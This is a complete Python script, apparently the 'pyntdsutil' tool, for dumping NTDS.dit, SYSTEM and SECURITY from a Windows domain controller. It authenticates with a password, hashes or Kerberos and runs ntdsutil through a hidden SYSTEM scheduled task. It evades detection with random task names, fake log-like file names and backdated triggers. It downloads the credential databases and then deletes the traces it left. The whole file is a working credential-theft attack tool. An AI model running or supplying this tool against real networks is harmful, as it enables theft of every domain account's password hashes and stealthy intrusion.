#!/usr/bin/env python3

import operator
import sys
import os
import argparse
import random
import string
import logging
import time
import ntpath

from datetime import datetime, timedelta
from impacket.examples import logger
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.utils import parse_target

CODEC = sys.stdout.encoding

logger.init()

parser = argparse.ArgumentParser(
    description="Dump NTDS.dit remotely with ntdsutil.exe via a modified version of atexec.py.", add_help=True
)

parser.add_argument(
    "target",
    action="store",
    help="[[domain/]username[:password]@]<target name or address>",
)

parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

parser.add_argument(
    "-hashes",
    action="store",
    metavar="LMHASH:NTHASH",
    help="NTLM hashes, format is LMHASH:NTHASH",
)
parser.add_argument(
    "-no-pass", action="store_true", help="Don't ask for password (useful for -k)"
)
parser.add_argument(
    "-k",
    action="store_true",
    help="Use Kerberos authentication. Grabs credentials from ccache file "
    "(KRB5CCNAME) based on target parameters. If valid credentials "
    "cannot be found, it will use the ones specified in the command "
    "line",
)
parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
parser.add_argument(
    "-dc-ip",
    action="store",
    metavar="ip address",
    help=(
        "IP Address of the domain controller. If omitted it will use the domain "
        "part (FQDN) specified in the target parameter"
    ),
)
parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                   '"%s"). If errors are detected, run chcp.com at the target, '
                                                   'map the result with '
                      'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute pyntdsutil'
                      'again with -codec and the corresponding codec ' % CODEC)

parser.add_argument('-output', action='store', help='Output directory for NTDS dump')

options = parser.parse_args()

if options.debug is True:
    logging.getLogger().setLevel(logging.DEBUG)
else:
    logging.getLogger().setLevel(logging.INFO)

def main():
    try:
        executor = Ntdsutil(options)
        executor.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print('ERROR: %s' % str(e))

def random_datetime(start_year=2012):
    current_year = datetime.now().year
    current_month = datetime.now().month
    current_day = datetime.now().day
    current_hour = datetime.now().hour
    current_minute = datetime.now().minute
    current_second = datetime.now().second
    current_microsecond = datetime.now().microsecond
    
    year = random.randint(start_year, current_year)
    
    if year == current_year:
        month = random.randint(1, current_month)
    else:
        month = random.randint(1, 12)
    
    if month == current_month and year == current_year:
        day = random.randint(1, current_day)
    else:
        day = random.randint(1, 28)  # This ensures we won't have any month/day mismatches
    
    if day == current_day and month == current_month and year == current_year:
        hour = random.randint(0, current_hour)
    else:
        hour = random.randint(0, 23)
    
    if hour == current_hour and day == current_day and month == current_month and year == current_year:
        minute = random.randint(0, current_minute)
    else:
        minute = random.randint(0, 59)

    if minute == current_minute and hour == current_hour and day == current_day and month == current_month and year == current_year:
        second = random.randint(0, current_second)
    else:
        second = random.randint(0, 59)

    if second == current_second and minute == current_minute and hour == current_hour and day == current_day and month == current_month and year == current_year:
        microsecond = random.randint(0, current_microsecond)
    else:
        microsecond = random.randint(0, 999999)

    result_date = datetime(year, month, day, hour, minute, second, microsecond)
    return result_date.isoformat()

class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                 command=None, sessionId=None, silentCommand=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__command = command
        self.__silentCommand = silentCommand
        self.sessionId = sessionId

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            self.doStuff(rpctransport)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def doStuff(self, rpctransport):
        def output_callback(data):
            if logging.getLogger().level == logging.DEBUG:
                try:
                    print(data.decode(CODEC))
                except UnicodeDecodeError:
                    logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute pyntdsutil '
                                'again with -codec and the corresponding codec')
                    print(data.decode(CODEC, errors='replace'))

        def xml_escape(data):
            replace_table = {
                 "&": "&amp;",
                 '"': "&quot;",
                 "'": "&apos;",
                 ">": "&gt;",
                 "<": "&lt;",
                 }
            return ''.join(replace_table.get(c, c) for c in data)

        def cmd_split(cmdline):
            cmdline = cmdline.split(" ", 1)
            cmd = cmdline[0]
            args = cmdline[1] if len(cmdline) > 1 else ''

            return [cmd, args]

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 50))])
        extensions = ['.log', '.txt', '.bak', '.xml', '.dmp', '.dtd', '.sys', '.etl']
        tmpFileName = tmpName + random.choice(extensions)
        random_date_str = random_datetime()
    
        dump_directories_task = [
            {"reg_path": f"C:\\PerfLogs\\{tmpFileName}",
             "share_path": f"PerfLogs\\{tmpFileName}"
            },
            {"reg_path": f"%%programdata%%\\Microsoft\\Windows\\Caches\\{tmpFileName}",
             "share_path": f"ProgramData\\Microsoft\\Windows\\Caches\\{tmpFileName}"
            },
            {"reg_path": f"%%windir%%\\Logs\\CBS\\{tmpFileName}",
             "share_path": f"Windows\\Logs\\CBS\\{tmpFileName}"
            }
        ]
        rdd_task = random.choice(dump_directories_task)

        if self.sessionId is not None:
            cmd, args = cmd_split(self.__command)
        else:
            cmd = "cmd.exe"
            args = f"/C %s > {rdd_task['reg_path']} 2>&1" % (self.__command)

        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>{random_date_str}</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % ((xml_escape(cmd)), 
            (xml_escape(args)))
        taskCreated = False
        try:
            logging.debug('Creating task \\%s' % tmpName)
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            logging.debug('Running task \\%s' % tmpName)
            done = False

            if self.sessionId is None:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            else:
                try:
                    tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                except Exception as e:
                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
                        logging.debug('The specified session doesn\'t exist!')
                        done = True
                    else:
                        raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)

            logging.debug('Deleting task \\%s' % tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.sessionId is not None:
            dce.disconnect()
            return

        smbConnection = rpctransport.get_smb_connection()
        waitOnce = True
        while True:
            try:
                logging.debug(f"Attempting to read C$\\{rdd_task['share_path']}")
                smbConnection.getFile('C$', rdd_task["share_path"], output_callback)
                break
            except Exception as e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                    if waitOnce is True:
                        # We're giving it the chance to flush the file before giving up
                        time.sleep(3)
                        waitOnce = False
                    else:
                        raise
                else:
                    raise
        logging.debug(f"Deleting file C$\\{rdd_task['share_path']}")
        smbConnection.deleteFile('C$', rdd_task["share_path"])

        dce.disconnect()

class Target:
    def __init__(self, options) -> None:
        domain, username, password, address = parse_target(options.target)

        if domain is None:
            domain = ""

        if (
            password == ""
            and username != ""
            and options.hashes is None
            and options.no_pass is not True
        ):
            from getpass import getpass

            password = getpass("Password:")
        hashes = options.hashes
        if hashes is not None:
            hashes = hashes.split(':')
            if len(hashes) == 1:
                (nthash,) = hashes
                lmhash = nthash
            else:
                lmhash, nthash = hashes
        else:
            lmhash = nthash = ''
        
        if options.dc_ip is None:
            options.dc_ip = address

        self.domain = domain
        self.username = username[:20]
        self.password = password
        self.address = address
        self.lmhash = lmhash
        self.nthash = nthash
        self.ntlmhash = "%s:%s" % (lmhash,nthash)
        self.do_kerberos = options.k
        self.dc_ip = options.dc_ip
        self.aesKey = options.aesKey

    def __repr__(self) -> str:
        return "<Target (%s)>" % repr(self.__dict__)

class Ntdsutil:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target(options)
        self.smb_session = None
        self._is_admin = None

        dump_directories_ntds = [
            "C:\\PerfLogs\\",
            "C:\\ProgramData\\Microsoft\\Windows\\Caches\\",
            "C:\\Windows\\Logs\\CBS\\"
        ]
        
        rdd_ntds = random.choice(dump_directories_ntds)

        self.share = "C$"
        self.tmp_dir = rdd_ntds
        self.tmp_share = rdd_ntds.split("C:\\")[1]
        self.dump_location = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 50))])
        commandFileName = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 50))])
        commandFileExtension = ['.log', '.txt', '.bak', '.xml', '.dmp', '.dtd', '.sys', '.etl']
        self.command_file = rdd_ntds + commandFileName + random.choice(commandFileExtension)
        current_date = datetime.now()
        formatted_date = current_date.strftime('%Y-%m-%d_%T')
        self.dir_result = f"pyntdsutil_{formatted_date}"
        if options.output is not None and options.output != '':
            self.dir_result = options.output

    def connect(self) -> None:
        try:
            self.smb_session = SMBConnection(self.target.address,self.target.address)
            if self.target.do_kerberos:
                self.smb_session.kerberosLogin(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash,
                    aesKey=self.target.aesKey
                    )
            else:
                self.smb_session.login(
                    user=self.target.username,
                    password=self.target.password,
                    domain=self.target.domain,
                    lmhash=self.target.lmhash,
                    nthash=self.target.nthash
                    )
        except Exception as e:
            print(str(e))
            sys.exit(1)
        return self.smb_session

    def run(self):
        self.connect()
        
        if self.is_admin:
            logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain.upper(), self.target.username, ( "(Admin!)" if self.is_admin  else "")))
            logging.info("Artifacts must be cleaned up manually if pyntdsutil is abruptly terminated.")
            command = ["powershell.exe -nop Set-Content -Encoding Default -Path '%s' -Value \"ac` i` ntds`r`nifm`r`ncreate` full` %s%s`r`nq`r`nq\"" % (self.command_file, self.tmp_dir, self.dump_location)]
            logging.debug('Writing command input file for ntdsutil.exe to %s' % (self.command_file))
            atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
                           ' '.join(command), None, silentCommand=operator.not_(self.options.debug))
            atsvc_exec.play(self.target.address)
            command = ["ntdsutil.exe < %s" % (self.command_file)]
            logging.info('Dumping NTDS.dit with ntdsutil.exe')
            atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
                           ' '.join(command), None, silentCommand=operator.not_(self.options.debug))
            atsvc_exec.play(self.target.address)
            if not os.path.isdir(self.dir_result):
                os.makedirs(self.dir_result, exist_ok=True)

            dumped = False
            directories = self.smb_session.listPath(shareName=self.share, path=ntpath.normpath(self.tmp_share + self.dump_location + '\\Active Directory\\ntds.dit'))
            for d in directories:
                if d.get_longname() == 'ntds.dit':
                    dumped = True
            if dumped:
                logging.info("Successfully dumped NTDS.dit")
            else:
                logging.error("Unable to dump NTDS.dit. Exiting...")
                sys.exit(1)

            logging.info("Downloading NTDS.dit, SYSTEM, and SECURITY")
            logging.debug('Copy NTDS.dit to host')
            with open(os.path.join(self.dir_result,'NTDS.dit'), 'wb+') as dump_file:
                try:
                    self.smb_session.getFile(self.share, self.tmp_share + self.dump_location + '\\Active Directory\\ntds.dit', dump_file.write)
                    logging.debug('Copied NTDS.dit file')
                except Exception as e:
                    logging.error('Error while getting NTDS.dit file: {}'.format(e))

            logging.debug('Copy SYSTEM to host')
            with open(os.path.join(self.dir_result,'SYSTEM'), 'wb+') as dump_file:
                try:
                    self.smb_session.getFile(self.share, self.tmp_share + self.dump_location + '\\registry\\SYSTEM', dump_file.write)
                    logging.debug('Copied SYSTEM file')
                except Exception as e:
                    logging.error('Error while getting SYSTEM file: {}'.format(e))

            logging.debug('Copy SECURITY to host')
            with open(os.path.join(self.dir_result,'SECURITY'), 'wb+') as dump_file:
                try:
                    self.smb_session.getFile(self.share, self.tmp_share + self.dump_location + '\\registry\\SECURITY', dump_file.write)
                    logging.debug('Copied SECURITY file')
                except Exception as e:
                    logging.error('Error while getting SECURITY file: {}'.format(e))
            logging.info("Output files to %s" % self.dir_result)
            try:
                command = ["powershell.exe -nop Remove-Item '%s', '%s%s' -Recurse -Force" % (self.command_file, self.tmp_dir, self.dump_location)]
                atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
                           ' '.join(command), None, silentCommand=operator.not_(self.options.debug))
                atsvc_exec.play(self.target.address)
                logging.debug('Deleted %s command input file for ntdsutil.exe' % (self.command_file))
                logging.debug('Deleted %s%s dump directory on the %s share' % (self.tmp_dir, self.dump_location, self.share))
                logging.info('Deleted artifacts on %s', self.target.address)
            except Exception as e:
                logging.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
        else:
            logging.info("Not an admin. Exiting...")
    
    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin
        try:
            self.smb_session.connectTree('C$')
            is_admin = True
        except:
            is_admin = False
            pass
        self._is_admin = is_admin
        return self._is_admin

if __name__ == '__main__':
    main()
